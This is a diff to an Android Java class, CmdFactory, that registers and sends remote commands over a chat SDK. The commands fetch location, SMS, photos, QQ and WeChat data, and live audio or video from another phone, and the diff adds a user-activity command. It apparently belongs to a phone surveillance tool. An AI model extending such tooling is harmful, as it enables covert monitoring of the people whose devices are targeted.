@@ -21,6 +21,7 @@ import com.lfish.control.action.cmddomian.GetLocationCmd;
 import com.lfish.control.action.cmddomian.GetPhotosCmd;
 import com.lfish.control.action.cmddomian.GetQQSdCmd;
 import com.lfish.control.action.cmddomian.GetSmsCmd;
+import com.lfish.control.action.cmddomian.GetUserActivityCmd;
 import com.lfish.control.action.cmddomian.GetWeChatSdCmd;
 import com.lfish.control.action.cmddomian.LockScreenCmd;
 import com.lfish.control.action.cmddomian.TackPhoto_BackCmd;
@@ -60,7 +61,7 @@ public class CmdFactory {
 		cmdSet.put(new GetQQSdCmd().getCmdNumber(), GetQQSdCmd.class);
 		cmdSet.put(new VideoOnlineCmd().getCmdNumber(), VideoOnlineCmd.class);
 		cmdSet.put(new AudioOnlineCmd().getCmdNumber(), AudioOnlineCmd.class);
-		cmdSet.put(new LockScreenCmd().getCmdNumber(), LockScreenCmd.class);
+		cmdSet.put(new GetUserActivityCmd().getCmdNumber(), GetUserActivityCmd.class);
 	}
 	
 	@SuppressLint("NewApi") 
@@ -86,6 +87,18 @@ public class CmdFactory {
 	public void SendCmd(int cmd,String sendTo,Object object){
 		BaseBeanCmd cmd2 = getCmd(cmd);
 		EMMessage message = EMMessage.createTxtSendMessage(cmd2.getMenuDes(), sendTo);
+		message.setAttribute(CMDFACTORY_SEND_DES_CMD, true);
+		message.setAttribute(CMDFACTORY_SEND_DES_CMDID, UUID.randomUUID()+"");
+		message.setAttribute(CMDFACTORY_SEND_DES_CMDNUMBER, cmd);
+		message.setAttribute(CMDFACTORY_SEND_DES_CMDTIME, System.currentTimeMillis() + "");
+		message.setAttribute(CMDFACTORY_SEND_DES_CMDPROPERTIEIS,new Gson().toJson(object));
+		message.setChatType(EMMessage.ChatType.Chat);
+		EMClient.getInstance().chatManager().sendMessage(message);
+	}
+
+	public void SendCmd(int cmd,String sendTo,Object object,String des){
+		BaseBeanCmd cmd2 = getCmd(cmd);
+		EMMessage message = EMMessage.createTxtSendMessage(des, sendTo);
 		message.setAttribute(CMDFACTORY_SEND_DES_CMD, true);
 		message.setAttribute(CMDFACTORY_SEND_DES_CMDID, UUID.randomUUID()+"");
 		message.setAttribute(CMDFACTORY_SEND_DES_CMDNUMBER, cmd);
